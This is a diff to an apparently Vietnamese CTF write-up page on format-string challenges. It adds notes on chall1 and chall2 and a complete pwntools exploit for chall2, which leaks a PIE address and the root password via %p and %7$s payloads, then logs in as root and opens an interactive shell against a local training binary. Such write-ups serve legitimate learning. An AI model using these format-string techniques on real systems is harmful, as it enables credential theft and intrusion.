@@ -174,7 +174,7 @@
 <ul>
 <li><a href="#say">say</a></li>
 <li><a href="#log_printer">log_printer</a></li>
-<li><a href="#chall1">chall1</a></li>
+<li><a href="#chall1">chall1</a> </li>
 <li><a href="#chall2">chall2</a></li>
 </ul>
 <hr />
@@ -1311,7 +1311,8 @@ r.interactive()
 
 </code></pre>
 <h2 id="chall1"><a class="header" href="#chall1">chall1</a></h2>
-<p><em><strong>chall này mình chưa giải ra</strong></em></p>
+<p><em><strong>chall này mình chưa giải ra</strong></em> </p>
+<p>Update: <em>chall này sau khi đọc wu thì mình thấy khá dễ, do là stack frame trên máy mình có vấn đề nên là mình chịu</em></p>
 <h3 id="file-5"><a class="header" href="#file-5">file</a></h3>
 <pre><code class="language-shell">▶ checksec chall1
 [*] '/mnt/d/pwn_myself/pwn_from_blabla/training/fmt/chall1/chall1'
@@ -1656,6 +1657,8 @@ pwndbg&gt; stack 100
 <p>Do là vừa không thể ovw gì với chỉ 1 lần nhập với Pie, và cũng không biết leak gì nên chall này mình khong làm được ==&quot;</p>
 <h1 id="chall2"><a class="header" href="#chall2">chall2</a></h1>
 <p><em><strong>chall này mình chưa giải ra</strong></em></p>
+<p>Update: <em>chall này sau khi tham khảo idea của 1 bạn thì mình đã hmm khá bất ngờ với sự ngusi cụa mình</em></p>
+<p>Idea như sau: ghi địa chỉ của password root lên stack rồi leak với %s, oke chỉ thế mà nghĩ méo ra đần ứ chịu được. <a href="#exploitcode">exploit</a></p>
 <pre><code class="language-file">▶ checksec chall2
 [*] '/mnt/d/pwn_myself/pwn_from_blabla/training/fmt/chall2/chall2'
     Arch:     amd64-64-little
@@ -1862,6 +1865,74 @@ int __fastcall sub_1804(void **a1)
 05:0028│ rdi 0x7fffffffdd78 —▸ 0x5555555592a0 ◂— 'username'
 06:0030│     0x7fffffffdd80 ◂— 0x4
 07:0038│     0x7fffffffdd88 ◂— 0xe1126ebd5b22aa00
+
+</code></pre>
+<h3 id="exploitcode"><a class="header" href="#exploitcode">exploitcode</a></h3>
+<pre><code class="language-python">from pwn import *
+
+while True:
+    try: 
+        binary = ELF(&quot;./chall2&quot;)
+        r = process(binary.path)
+        context.log_level='debug'
+        #gdb.attach(r, api=True)
+
+        payload = b&quot;&quot;
+
+        r.sendline(b&quot;1&quot;)
+        payload1 = b&quot;%p..%p..%p..%p..%p..%p..%p..%p..%p..%p|%p|&quot;
+        payload2 = b&quot;%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p&quot;
+
+        r.sendlineafter(b&quot;Username: &quot;, payload1)
+        r.sendlineafter(b&quot;Password: &quot;, payload2)
+
+        r.sendline(b&quot;2&quot;)
+        r.sendlineafter(b&quot;Username: &quot;, payload1)
+        r.sendlineafter(b&quot;Password: &quot;, payload2)
+
+        r.sendline(b&quot;3&quot;)
+        recv = int(r.recv().split(b&quot;|&quot;)[1], 16)  # 0x558e40e5141d
+        log.info(&quot;Main addr pie: &quot; + hex(recv))
+        main_offset_pie = 0x0000141d
+        binary.address = recv - main_offset_pie
+        log.info(&quot;Pie base addr: &quot; + hex(binary.address))
+
+        r.sendline(b&quot;1&quot;)
+        payload1 = p64(binary.address + 0x4110)
+        payload2 = b&quot;*|*%7$s*|*%p%p%p%p%p%p&quot;
+        r.sendlineafter(b&quot;Username: &quot;, payload1)
+        r.sendlineafter(b&quot;Password: &quot;, payload2)
+        r.recv()
+        r.sendline(b&quot;2&quot;)
+        r.sendlineafter(b&quot;Username: &quot;, payload1)
+        r.sendlineafter(b&quot;Password: &quot;, payload2)
+        r.recv()
+        r.sendline(b&quot;3&quot;)
+        recv = r.recv().split(b&quot;*|*&quot;)[1]
+        log.info(b&quot;Password: &quot; + recv)
+        r.recv()
+
+        if len(recv) == 47:
+            log.info(&quot;pwned :3&quot;)
+            r.sendline(b&quot;1&quot;)
+            payload1 = b&quot;root&quot;
+            payload2 = recv
+            r.sendlineafter(b&quot;Username: &quot;, payload1)
+            r.sendlineafter(b&quot;Password: &quot;, payload2)
+            r.sendline(b&quot;2&quot;)
+            r.sendlineafter(b&quot;Username: &quot;, payload1)
+            r.sendlineafter(b&quot;Password: &quot;, payload2)
+            r.sendline(b&quot;3&quot;)
+            r.sendline(b&quot;4&quot;)
+            r.sendline(&quot;ls&quot;)
+            r.interactive()
+
+            break
+        else:
+            r.close()
+    except:
+        continue
+
 
 </code></pre>
 
